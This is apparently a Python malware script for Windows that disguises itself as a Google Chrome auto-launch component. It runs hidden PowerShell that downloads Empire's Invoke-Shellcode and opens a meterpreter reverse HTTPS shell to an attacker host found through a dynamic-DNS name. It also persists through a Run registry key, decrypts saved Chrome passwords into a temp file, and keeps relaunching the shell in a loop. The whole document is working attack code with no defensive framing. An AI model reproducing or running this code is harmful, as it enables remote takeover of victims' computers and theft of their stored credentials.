import subprocess
import tempfile
import _winreg
import platform
import time
import os
import socket
import urllib
import sqlite3
import win32crypt
import sys

NO_IP_HOST = 'googlechromeauto.serveirc.com'
LHOST = '192.168.1.3'
LPORT = 443
TIME_SLEEP = 10

TEMP_PATH = tempfile.gettempdir()
REG_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
REG_NAME = "GoogleChromeAutoLaunch_9921366102WEAD21312ESAD31312"
REG_VALUE = '"' + TEMP_PATH + '\GoogleChromeAutoLaunch.exe' + '"' + ' --no-startup-window /prefetch:5'

def set_reg_key_value(REG_PATH, name, value):
    try:
        registry_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, REG_PATH, 0,_winreg.KEY_ALL_ACCESS)
        _winreg.SetValueEx(registry_key, name, 0, _winreg.REG_SZ, value)
    except WindowsError:
        pass

def fire():
    if NO_IP_HOST:
        # Check if no-ip is online or not
        get_noip_ip_address()

    if platform.machine().endswith('32') or platform.machine().endswith('86'):
        try:
            subprocess.Popen("powershell -noprofile -windowstyle hidden iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/code_execution/Invoke-Shellcode.ps1');Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost %s -Lport %s -Force;" % (LHOST,LPORT), shell=True)
        except WindowsError:
            pass
    else:
        try:
            subprocess.Popen("C:\Windows\SysWOW64\WindowsPowerShell\/v1.0\powershell.exe -noprofile -windowstyle hidden iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/code_execution/Invoke-Shellcode.ps1');Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost %s -Lport %s -Force;" % (LHOST,LPORT), shell=True)
        except WindowsError:
            pass

def run_after_close():
    foundIT = False
    runningProcess = []
    for item in os.popen('tasklist').read().splitlines()[4:]:
        runningProcess.append(item.split())
    for item2 in runningProcess:
        if "powershell.exe" in item2:
            foundIT = True

    if not foundIT:
        fire()


def get_noip_ip_address():
    global NO_IP_HOST
    global LHOST
    LHOST = socket.gethostbyname(NO_IP_HOST)

def dump_google_password():
    path = ''
    try:
        path = sys.argv[1]
    except IndexError:
        for w in os.walk(os.getenv('USERPROFILE')):
            if 'Chrome' in w[1]:
                path = str(w[0]) + '\Chrome\User Data\Default\Login Data'

    # Connect to the Database
    try:
        conn = sqlite3.connect(path)
        cursor = conn.cursor()
    except Exception:
        pass
    else:
        try:
            cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        except Exception:
            pass
        else:
            data = cursor.fetchall()
            GoogleAutoPassPath = TEMP_PATH + '//GoogleAutoPass'
            passGoogle = open(GoogleAutoPassPath,'w')
            for result in data:
                # Decrypt the Password
                try:
                    password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
                except Exception:
                    continue
                if password:
                    try:
                        passGoogle.write("[+] URL: %s \n    Username: %s \n    Password: %s \n" % (result[0], result[1], password))
                    except Exception:
                        pass
            passGoogle.close()


# fire the payload
fire()
time.sleep(5)
# set the reg value in run key
set_reg_key_value(REG_PATH,REG_NAME,REG_VALUE)

# dump google chrome password
dump_google_password()

# keep firing in case of the connection is loss
while True:
    run_after_close()
    time.sleep(TIME_SLEEP)
